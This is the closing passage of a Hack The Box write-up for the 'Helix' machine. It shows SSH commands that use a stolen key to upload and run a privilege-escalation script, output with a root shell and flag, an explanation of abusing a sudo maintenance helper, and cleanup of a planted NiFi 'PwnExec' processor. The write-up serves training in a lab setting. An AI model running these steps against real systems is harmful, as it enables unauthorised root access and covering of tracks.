+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -i /tmp/helix/operator_id_ed25519 /tmp/full_pwn.py operator@10.129.28.235:/tmp/</span><br><span class="line">ssh -i /tmp/helix/operator_id_ed25519 operator@10.129.28.235 <span class="string">&#x27;python3 /tmp/full_pwn.py&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  off=1   T=283.10</span><br><span class="line">  off=2   T=285.22</span><br><span class="line">  off=3   T=287.41</span><br><span class="line">  off=4   T=289.55</span><br><span class="line">  off=5   T=291.66</span><br><span class="line">  off=6   T=293.07</span><br><span class="line">  off=7   T=295.23</span><br><span class="line">=== STDOUT ===</span><br><span class="line">[*] /usr/local/sbin/helix-maint-console</span><br><span class="line">[*] Checking maintenance window … OK (53s remaining)</span><br><span class="line">[+] Privileged maintenance access granted</span><br><span class="line">[!] Window expires in 60 seconds</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">helix</span><br><span class="line">cf65123e46eaea3d48214cc658ff1a73</span><br><span class="line"></span><br><span class="line">=== STDERR ===</span><br></pre></td></tr></table></figure></div>
+
+<p><code>/usr/local/sbin/helix-maint-console</code> reads <code>/opt/helix/state/maintenance_window</code> — a 0750-protected unix-timestamp file that the <code>helix-safety</code> service writes once the safety conditions hold — and while that timestamp is still in the future it spawns <code>bash -p -i</code> under a fresh systemd scope. The scope inherits root because the helper itself was launched via <code>sudo</code>. Feeding commands into the helper’s stdin gets us <code>root.txt</code> without ever needing a TTY.</p>
+<h2 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h2><p>Finally we tidy up after ourselves — remove the scripts we dropped and locate the NiFi processor we created so it can be stopped and deleted:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /tmp/helix/operator_id_ed25519 operator@10.129.28.235 <span class="string">&#x27;rm -f /tmp/full_pwn.py /tmp/enum_opcua.py&#x27;</span></span><br><span class="line"><span class="comment"># stop the NiFi processor I created (it&#x27;s harmless once stopped but visible in the audit log)</span></span><br><span class="line">curl -s <span class="string">&quot;http://flow.helix.htb/nifi-api/process-groups/<span class="subst">$(curl -s http://flow.helix.htb/nifi-api/process-groups/root | python3 -c &#x27;import sys,json;print(json.load(sys.stdin)</span>[&quot;</span><span class="built_in">id</span><span class="string">&quot;])&#x27;)/processors&quot;</span> \</span><br><span class="line">    | python3 -c <span class="string">&#x27;import sys,json</span></span><br><span class="line"><span class="string">for p in json.load(sys.stdin).get(&quot;processors&quot;,[]):</span></span><br><span class="line"><span class="string">    if p[&quot;component&quot;][&quot;name&quot;]==&quot;PwnExec&quot;:</span></span><br><span class="line"><span class="string">        print(p[&quot;id&quot;], p[&quot;revision&quot;][&quot;version&quot;])&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>For audit cleanliness you can <code>PUT</code> the processor back to <code>STOPPED</code> and then <code>DELETE</code> it with the right revision.</p>
+<p>And that was Helix — from an anonymous NiFi processor all the way to bending a simulated reactor’s safety window to pop a root shell. Hope you enjoyed!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Helix</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-08-08 14:20:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-08-08 09:00:03
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/08/08/Hackthebox-Helix/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/08/06/Hackthebox-Kobold/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Kobold</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Helix</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vhost-brute-forcing"><span class="nav-text">Vhost brute forcing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-%E2%80%94-Apache-NiFi-RCE-%E2%86%92-shell-as-nifi"><span class="nav-text">Foothold — Apache NiFi RCE → shell as nifi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Confirm-anonymous-write-on-the-root-process-group"><span class="nav-text">Confirm anonymous write on the root process-group</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stand-up-a-multi-command-reverse-shell-listener"><span class="nav-text">Stand up a multi-command reverse-shell listener</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Drop-an-ExecuteProcess-processor-that-calls-back"><span class="nav-text">Drop an ExecuteProcess processor that calls back</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Where-we-landed"><span class="nav-text">Where we landed</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivot-to-operator"><span class="nav-text">Pivot to operator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Find-a-cached-SSH-key"><span class="nav-text">Find a cached SSH key</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-in-and-grab-user-txt"><span class="nav-text">SSH in and grab user.txt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Loot-operator%E2%80%99s-home-%E2%80%94-and-check-sudo"><span class="nav-text">Loot operator’s home — and check sudo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#What%E2%80%99s-in-operator"><span class="nav-text">What’s in ~operator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exfil-the-diagram-and-the-PDF"><span class="nav-text">Exfil the diagram and the PDF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-PDF-is-password-protected-%E2%80%94-crack-it"><span class="nav-text">The PDF is password-protected — crack it</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-%E2%80%94-open-the-maintenance-window-over-OPC-UA-then-sudo-helix-maint-console"><span class="nav-text">Root — open the maintenance window over OPC-UA, then sudo helix-maint-console</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumerate-the-OPC-UA-tree"><span class="nav-text">Enumerate the OPC-UA tree</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Single-process-%E2%80%9Copen-the-window-run-the-sudo-helper%E2%80%9D-script"><span class="nav-text">Single-process “open the window + run the sudo helper” script</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cleanup"><span class="nav-text">Cleanup</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
